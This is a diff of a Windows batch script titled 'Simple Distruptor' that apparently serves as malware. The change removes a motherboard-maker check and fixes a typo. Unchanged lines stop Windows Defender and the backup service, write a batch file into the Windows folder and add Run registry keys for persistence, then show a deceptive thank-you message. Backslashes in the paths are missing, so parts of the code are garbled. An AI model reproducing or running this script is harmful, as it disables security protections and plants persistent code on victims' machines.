@@ -1,9 +1,7 @@
 title Simple Distruptor
 
-FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
-SET check=%%F
-)
-    
+echo off
+
 
 net stop "SDRSVC"
 net stop "WinDefend"
@@ -39,7 +37,7 @@ echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 echo Loading...
-echo Tanks you for your coroperation!
+echo Thanks you for your coroperation!
 echo YOu may now close this by pressing enter...
 PAUSE
 @echo off
